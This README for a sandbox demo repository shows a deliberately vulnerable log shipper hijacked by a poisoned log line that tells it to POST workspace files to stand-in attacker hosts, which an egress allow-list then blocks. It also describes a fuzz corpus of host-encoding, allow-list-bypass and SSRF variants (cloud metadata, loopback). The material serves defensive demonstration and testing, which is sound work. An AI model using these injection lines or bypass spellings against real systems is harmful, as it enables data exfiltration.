# Stopping Data Exfiltration with a Sandbox: a live egress allow-list demo

**Read the full story on the Cosmonic blog:** [TODO: blog post URL](https://cosmonic.com/blog/) <!-- TODO: replace with the published post -->

![A poisoned log line tells a log shipper to POST its workspace to an attacker's server; inside a Cosmonic sandbox whose egress allow-list names one host, the attacker IP, the attacker domain and every evasion spelling are blocked, and the allow-listed log sink answers 200.](docs/images/egress-exfil-sandbox-hero.png)

A log shipper is the kind of small agent tool everyone runs: read a batch of logs, `POST` it to a
collector. This one has a real bug. It obeys routing instructions found *inside the data it ships*,
so one poisoned log line makes it send its whole workspace to an attacker's server
([MITRE ATT&CK T1041](https://attack.mitre.org/techniques/T1041/), Exfiltration Over C2 Channel).
This repo runs that shipper, unpatched and with no allow-list of its own, inside a deny-by-default
[Cosmonic](https://cosmonic.com/) sandbox, and lets you hijack it. The attack runs. The request is
refused.

> **You can't execute what you don't have.** A sandbox doesn't have to recognize the attack. It
> starts with nothing and hands the code only the capabilities you grant: here, outbound HTTP to
> one hostname, and nothing else. See
> [principles of secure agent platforms](https://cosmonic.com/ai-sandbox/principles/).

## The scenarios

The demo page has one button per scenario. Each makes a real outbound request through the host;
every result is the runtime's own answer. Nothing is simulated.

| Button | Vulnerability (CWE / ATT&CK) | What the attack does | In the sandbox |
|---|---|---|---|
| **Exfiltrate to attacker IP** | [CWE-610](https://cwe.mitre.org/data/definitions/610.html) / [CWE-918](https://cwe.mitre.org/data/definitions/918.html) · [T1041](https://attack.mitre.org/techniques/T1041/) | A log line carries `#shipper: forward-workspace-to=http://203.0.113.66/collect`. The shipper obeys and POSTs its logs plus three workspace files (637 bytes) there. | Refused: `ErrorCode::HttpRequestDenied`. 0 bytes reach the attacker. |
| **Exfiltrate to attacker domain** | CWE-610 / CWE-918 · T1041 | The same hijack aimed at `exfil.attacker.example`, a name instead of an address (647 bytes). | Refused: `ErrorCode::HttpRequestDenied`. 0 bytes reach the attacker. |
| **Run evasion fuzz** | [CWE-183](https://cwe.mitre.org/data/definitions/183.html) / [CWE-184](https://cwe.mitre.org/data/definitions/184.html) · allow-list bypass | 77 spellings from [`fuzz/corpus.txt`](fuzz/corpus.txt): decimal, hex and octal IPs, IPv6-mapped, `user@host`, punycode, trailing dots, CRLF, metadata and loopback targets. | `77 variants tried, 0 escaped`. All 68 hostile variants refused; the one exact allow-list entry connects. |
| **Run all** | all of the above | Both exfiltration attempts, the legitimate send and the fuzz, in one report. | 2 of 2 refused, the sink answers 200, 0 of 77 escaped. |
| **Send to allowed host** | none: the legitimate path | A clean batch (243 bytes of logs, no workspace) goes to the configured sink, `egress-exfil-logsink.localhost`. | Delivered: HTTP 200, the sink's receipt comes back. |

The attacker destinations are `203.0.113.66` (TEST-NET-3, [RFC 5737](https://www.rfc-editor.org/rfc/rfc5737), never
routed) and `exfil.attacker.example` (`.example`, [RFC 2606](https://www.rfc-editor.org/rfc/rfc2606), never
resolves). The workspace is inert, labelled-fake text compiled into the component. Nothing real is
ever sent anywhere, and nothing leaves your machine.

## An enforced boundary, which is why it is fuzzed

There are two ways a sandbox says no. A **structural** boundary is an absence: the component has no
import for sockets, so there is no call to make. An **enforced** boundary is a check: the component
does have `wasi:http/client`, and on every request the host compares the destination against the
Workload's `allowedHosts`.

This demo is the second kind. A check is a piece of code that parses a string, so it is
implementation-dependent and it can be wrong; URL and host parsing is exactly where allow-lists
have historically been bypassed. That is the reason this repo ships a fuzz harness instead of
asking you to take the table above on trust. See [Evasion fuzz](#evasion-fuzz).

The shipper also has structural limits. `cosmonic_image_inspect` shows no `wasi:sockets` and no
`wasi:filesystem` import at all, so raw TCP, UDP and DNS lookups, and reading files to exfiltrate,
are not policy questions: there is nothing to call.

## Quickstart

1. **Install [Cosmonic Desktop](https://cosmonic.com/desktop/).** It runs WebAssembly components as
   sandboxed workloads on macOS, Windows and Linux, and listens on `127.0.0.1:8200`.
2. **Build and publish the two components** to Desktop's built-in registry (see
   [Build from source](#build-from-source)). The manifests pin local images by digest.
3. **Apply two manifests**, sink first. The easiest route is an AI assistant connected to Desktop's
   MCP server ([Connect coding agents](https://cosmonic.com/docs/desktop/coding-agents/)):

   > "Apply `deploy/egress-exfil-logsink.workload.yaml`, then
   > `deploy/egress-exfil-sandbox.workload.yaml`, to Cosmonic Desktop, and show me their status."

4. **Open <http://egress-exfil-sandbox.localhost:8200/>** and press the buttons.
   `/#all` presses **Run all** on load; `/#exfil`, `/#domain`, `/#allowed` and `/#fuzz` work too.

For deny-all, apply [`deploy/egress-exfil-sandbox.strict.workload.yaml`](deploy/egress-exfil-sandbox.strict.workload.yaml)
instead: the same workload with `allowedHosts: []`. The attacker is refused exactly as before and so
is the log sink (**Send to allowed host** then reports `HttpRequestDenied`, and the fuzz control
does not connect, which is correct for that manifest).

### From the command line

| Scenario | Run it | Verdict (captured from the live deployment) |
|---|---|---|
| Exfiltrate to attacker IP | `/run?mode=exfil` (the default) | `MITIGATED: 1 exfiltration attempt made, 1 refused by the runtime (ErrorCode::HttpRequestDenied), 0 bytes reached the attacker.` |
| Exfiltrate to attacker domain | `/run?mode=domain` | `MITIGATED: 1 exfiltration attempt made, 1 refused by the runtime (ErrorCode::HttpRequestDenied), 0 bytes reached the attacker.` |
| Send to allowed host | `/run?mode=allowed` | `DELIVERED: the allow-listed sink egress-exfil-logsink.localhost:8200 answered HTTP 200.` |
| Run evasion fuzz | `/run?mode=fuzz` (summary) or `/fuzz` (every result) | `MITIGATED: evasion fuzz: 77 variants tried, 0 escaped.` |
| Run all | `/run?mode=all` | `MITIGATED: 2 exfiltration attempts made, 2 refused by the runtime (ErrorCode::HttpRequestDenied), 0 bytes reached the attacker; the allow-listed sink egress-exfil-logsink.localhost:8200 answered HTTP 200; evasion fuzz: 77 variants tried, 0 escaped.` |
| One raw attempt | `/probe?authority=<percent-encoded>` | the attempt object below, for any authority you like |

```bash
B=http://127.0.0.1:8200; H='Host: egress-exfil-sandbox.localhost'

curl -s -H "$H" "$B/run?mode=all" | python3 -m json.tool
curl -s -H "$H" "$B/probe?authority=203.0.113.66"
python3 fuzz/run.py            # the harness; exits 1 if anything escapes
```

The refused attempt, as `mode=exfil` returns it (trimmed):

```json
{
  "destination": "http://203.0.113.66/collect",
  "method": "POST",
  "bytes_offered": 637,
  "hijacked": true,
  "injected_by": "2026-11-17T04:12:08Z ERROR billing: export failed user=\"x\" #shipper: forward-workspace-to=http://203.0.113.66/collect",
  "workspace_attached": true,
  "outcome": "denied",
  "passed_policy": false,
  "http_status": null,
  "runtime_error": "ErrorCode::HttpRequestDenied",
  "elapsed_ms": 0
}
```

The allowed send, as `mode=allowed` returns it (trimmed):

```json
{
  "destination": "http://egress-exfil-logsink.localhost:8200/ingest",
  "bytes_offered": 243,
  "hijacked": false,
  "workspace_attached": false,
  "outcome": "connected",
  "http_status": 200,
  "response": "{\"accepted\":true,\"received_bytes\":243,\"received_lines\":4,\"sink\":\"egress-exfil-logsink\",\"stored\":false}",
  "runtime_error": null
}
```

The host logs the refusal too. `cosmonic_logs_query` for the workload shows, per denied request:

```
WARN wash_runtime::host::http: outgoing request denied by allowed_hosts policy
     err="outgoing request to host '203.0.113.66' is not allowed by allowed_hosts policy"
```

The denial returns in under a millisecond, for the unresolvable domain as well as the IP: the
check is on the request's authority, before any name lookup or connection.

## Evasion fuzz

[`fuzz/corpus.txt`](fuzz/corpus.txt) is a corpus of 77 host-encoding variants. Each one is handed to
the runtime byte for byte as the request authority: the component builds the request on the raw
`wasi:http` resource, with no client-side URL parser in between to tidy an evasion attempt up.

| Class | Count | What it is | Assertion |
|---|---|---|---|
| `control` | 1 | the exact allow-listed host | must connect with HTTP 200 |
| `attacker` | 29 | the attacker IP and domain, respelled: decimal `3405803842`, hex `0xcb007142`, octal, short `inet_aton` forms, IPv4-mapped / NAT64 / 6to4 IPv6, fullwidth digits, percent-encoding, case, trailing dot, punycode, raw IDN, stray whitespace | must not pass the allow-list |
| `confusable` | 24 | the allow-listed name used as camouflage: `sink@attacker` userinfo, `attacker#@sink`, backslash, suffix and prefix domains, an un-granted subdomain, homoglyph and its punycode, NUL, CRLF header injection, comma and space lists | must not pass the allow-list |
| `ssrf` | 15 | `169.254.169.254` and its IPv6, decimal and mapped forms, `metadata.google.internal`, loopback as `127.0.0.1`, `127.1`, `2130706433`, `[::1]`, `0.0.0.0`, `localhost`, `host.wasmcloud.internal`, a sibling `.localhost` name, link-local IPv6 | must not pass the allow-list |
| `equivalent` | 7 | other spellings of the allow-listed host itself | recorded, never an escape |
| `byport` | 1 | the allow-listed host on another port | recorded: the list is hostname-only |

"Pass the allow-list" is deliberately wider than "connected". A hostile variant counts as escaped if
it connected **or** if it failed later for a transport reason (DNS, connection refused, timeout),
because that means the policy let it through.

Two ways to run it, over the same corpus:

- **On the page and at `/fuzz`.** The corpus is compiled into the shipper, which fires all 77 at the
  runtime and reports `N variants tried, M escaped`. The page fetches this live on every load.
- **From the command line.** [`fuzz/run.py`](fuzz/run.py) (Python 3, standard library only) reads
  `corpus.txt`, drives the *deployed* component through `/probe` one variant at a time, applies the
  assertions itself, cross-checks the component's own `/fuzz` count and exits non-zero on any escape.

Result against the live deployment (Cosmonic Desktop 0.5.32, runtime 2.12.0):

```
77 variants tried, 0 escaped
  must-refuse variants: 68, refused: 68 | denied by policy: 50 | rejected as malformed: 22 | connected: 4 | passed policy then failed: 1
  control: 1 of 1 connected with HTTP 200
  component /fuzz reports: 77 variants tried, 0 escaped (agrees)
PASS: no attacker, confusable or SSRF variant got past the allow-list
```

How the 68 hostile variants were stopped: 49 reached the policy check and were refused with
`HttpRequestDenied`; 19 were refused earlier, when the runtime would not accept the string as a
request authority at all (`set-authority` fails for raw Unicode, percent-encoding, whitespace,
control bytes, and `user:pass@`, `#`, `?`, `\` and `/` forms). Those never became a request.
`set-authority` returns a bare error with no code, so for those rows the report's `runtime_error`
is the component's one-line description of that failure and `rejected_at` names the call.

**Conformance baseline.** The upstream
[`WebAssembly/wasi-testsuite`](https://github.com/WebAssembly/wasi-testsuite) is the conformance
baseline for a WASI runtime: it establishes that the interfaces behave as specified. It does not
exercise a host's egress policy, which is an embedder feature layered on `wasi:http`. This corpus is
the adversarial layer on top of that baseline, aimed at the policy check itself. The testsuite was
not re-run as part of this repo.

## Findings

**No escape found.** Across 77 variants, nothing other than the allow-listed host got past the
allow-list. Recorded for completeness, because they describe how the check behaves:

- **Case is folded.** `EGRESS-EXFIL-LOGSINK.LOCALHOST` passes the allow-list, as documented
  (matching is case-insensitive). It is the same host; Desktop's ingress then answers 404 because
  its own routing is case-sensitive.
- **A trailing dot is not folded.** `egress-exfil-logsink.localhost.` is refused. Stricter than DNS.
- **A leading zero on the port is accepted.** `:08200` connects to the sink (HTTP 200). Same
  destination.
- **The allow-list is hostname-only; the port is not part of it.** `egress-exfil-logsink.localhost:9`
  passes the policy and fails with `ConnectionRefused`. This is the documented design, and it has a
  consequence worth knowing when the allow-listed name is a `.localhost` name, as it is in this
  demo: `.localhost` resolves to loopback, so that one entry makes every loopback port reachable
  over HTTP under that name, without the separate `allowedHostLoopbackPorts` grant that gates
  `host.wasmcloud.internal`. Other loopback spellings (`127.0.0.1`, `localhost`, `[::1]`, sibling
  `.localhost` names) are all refused. In production, allow-list names that resolve off-host. This
  is flagged for upstream discussion as a hardening question, not as a bypass: the operator granted
  the name.
- **Not tested:** DNS rebinding (an allow-listed public name whose record points at a private or
  loopback address), redirects from an allow-listed host, HTTPS and SNI/Host mismatches, and
  authorities that are not valid UTF-8 (a WIT `string` cannot carry them).

## The long tail this boundary also covers

T1041 is one technique in a column. The same `allowedHosts` check, plus the absence of
`wasi:sockets`, bears on the neighbouring command-and-control and exfiltration techniques. Stated
carefully, for *this* workload:

| Technique | What it needs | Here |
|---|---|---|
| [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | A non-HTTP channel: DNS, ICMP, FTP, raw TCP or UDP | No `wasi:sockets` import and no name-lookup interface, so there is no alternative protocol to open. Structural. |
| [T1567](https://attack.mitre.org/techniques/T1567/) Exfiltration Over Web Service | HTTPS to a legitimate service (a paste site, cloud storage, a webhook) | Refused unless that service's hostname is on the allow-list. Enforced. If you allow-list a multi-tenant service, an attacker's account on it is reachable too: scope the list to hosts you control. |
| [T1071](https://attack.mitre.org/techniques/T1071/) Application Layer Protocol (C2) | An outbound connection to a C2 server over HTTP(S), DNS or mail protocols | HTTP(S) to an unlisted host is refused; the other protocols have no interface. An inbound request can still drive the component, which is the premise of the demo. |
| [T1572](https://attack.mitre.org/techniques/T1572/) Protocol Tunneling | Wrapping one protocol in another, to a tunnel endpoint | The only outbound carrier is HTTP to the allow-listed host, so a tunnel can only terminate there. Not possible to an unlisted endpoint. |
| [T1090](https://attack.mitre.org/techniques/T1090/) Proxy | Relaying through an intermediary | The component cannot name a proxy of its own choosing (unlisted, so refused) and cannot listen for connections (no sockets). An allow-listed host that is itself an open proxy would be a hole: do not allow-list one. |

What this does not claim: an allow-list constrains *where* data can go, not *what* is sent. If the
allow-listed sink is compromised, or the allow-listed service is one the attacker can also read,
data can leave through it. Deny-by-default makes that list short and explicit; it does not make an
entry on it safe.

## See it succeed without a sandbox

[`native-demo/`](native-demo/README.md) is a small Rust CLI that compiles the *same* `workspace.rs`
(the same routing bug) and runs it natively. A native process can open a socket to anything, so the
exfiltration just works. To show that without sending anything anywhere, the "attacker" is a
listener the program starts itself on `127.0.0.1`.

```bash
cd native-demo
cargo run
```

It ends with `VULNERABLE: 640 bytes exfiltrated, 3 workspace files delivered to the attacker.
Nothing refused the connection.` Same code, same poisoned line; the only difference is what the
code was handed.

## How it's built

Two workloads on one machine. The shipper is the sandbox under test; the log sink is the legitimate
destination, deployed locally so the allowed path is genuinely live and nothing leaves the laptop.

| Workload | Component | Filesystem | Network out | HTTP in | Job |
|---|---|---|---|---|---|
| `egress-exfil-sandbox` | `shipper` | none | `allowedHosts: ["egress-exfil-logsink.localhost"]` | serves `wasi:http/handler` | the UI, `/run`, and the vulnerable shipper |
| `egress-exfil-logsink` | `logsink` | none | `allowedHosts: []` | serves `wasi:http/handler` | `POST /ingest` returns a receipt; stores nothing |

- **The bug is real and unpatched.** [`workspace.rs`](cosmonic-app/shipper/src/workspace.rs) `route()`
  (marked `VULN:`) treats a `#shipper: forward-workspace-to=<url>` marker in a log line as a routing
  instruction and attaches the workspace. There is no destination check anywhere in the component.
- **The whole mitigation is one line of the manifest.** `allowedHosts` names the sink. Any other
  authority is refused by the host with `ErrorCode::HttpRequestDenied`.
- **The allowed host is a local workload.** BUILD_INSTRUCTIONS sketches the allow-listed host as
  `logs.internal.example`; that name does not resolve, so the button could not have been live. The
  manifest names the host that actually answers, `egress-exfil-logsink.localhost`, reached through
  Desktop's own ingress on port 8200.
- **Grants are confirmed, not asserted.** `cosmonic_image_inspect` on the shipper image shows
  `wasi:http/client@0.3.0` and `wasi:http/types@0.3.0` as its only network imports and
  `wasi:http/handler@0.3.0` as its export; no `wasi:sockets`, no `wasi:filesystem`.
  `cosmonic_workload_get` shows `allowedHosts: ["egress-exfil-logsink.localhost"]` and no volumes.

The same manifest runs on Kubernetes with [Cosmonic Control](https://cosmonic.com/control/), where
these grants can be enforced with admission policies (sign the images and remove the
`unsafe-allow-unsigned` annotation first). See
[Securing a cluster](https://cosmonic.com/docs/operations/securing-a-cluster/).

## Build from source

You need a Rust toolchain (1.94 or newer) with the `wasm32-wasip2` target, and `wash`. Cosmonic
Desktop's Preflight check installs all three.

```bash
cd cosmonic-app/shipper && wash build     # or: cargo build --target wasm32-wasip2 --release
cd ../logsink           && wash build
cd ..

# publish to Desktop's built-in registry (bump the tag on every rebuild)
wash oci push --insecure oci.localhost:8200/apps/egress-exfil-sandbox-shipper:0.1.2 \
  shipper/target/wasm32-wasip2/release/egress_exfil_shipper.wasm
wash oci push --insecure oci.localhost:8200/apps/egress-exfil-sandbox-logsink:0.1.0 \
  logsink/target/wasm32-wasip2/release/egress_exfil_logsink.wasm
```

Then update the `@sha256:` digests in `deploy/*.workload.yaml` if your build differs, and apply the
manifests. The fuzz corpus is compiled into the shipper, so rebuild it after editing
`fuzz/corpus.txt` (`fuzz/run.py` tells you if the two disagree). `docs/hero/render.sh` regenerates
the hero image.

## Repo layout

```
.
├── deploy/
│   ├── egress-exfil-sandbox.workload.yaml          the shipper: one host allow-listed
│   ├── egress-exfil-sandbox.strict.workload.yaml   the same, allowedHosts: [] (deny-all)
│   └── egress-exfil-logsink.workload.yaml          the log sink (apply first)
├── cosmonic-app/
│   ├── wit/egress-demo.wit                         cosmonic:egress-demo, the two worlds written down
│   ├── shipper/                                    the vulnerable shipper + UI (Rust, p3)
│   └── logsink/                                    the allow-listed destination (Rust, p3)
├── fuzz/
│   ├── corpus.txt                                  77 host-encoding evasion variants
│   └── run.py                                      harness: drives the deployed component, asserts containment
├── native-demo/                                    the same bug with no sandbox (loopback only)
└── docs/
    ├── hero/                                       hero source (HTML) and render.sh
    └── images/egress-exfil-sandbox-hero.png
```

## Keep reading

[Choosing an agent sandbox](https://cosmonic.com/ai-sandbox/choosing-an-agent-sandbox/) ·
[Deny by default](https://cosmonic.com/ai-sandbox/principles/deny-by-default/) ·
[Least authority](https://cosmonic.com/ai-sandbox/least-privilege-ai-agents/) ·
[Capabilities over ambient authority](https://cosmonic.com/ai-sandbox/capabilities/)

Questions, or a case where this breaks? Find us in the [wasmCloud Slack](https://slack.wasmcloud.com/).

## License

Apache-2.0. See [LICENSE](LICENSE).
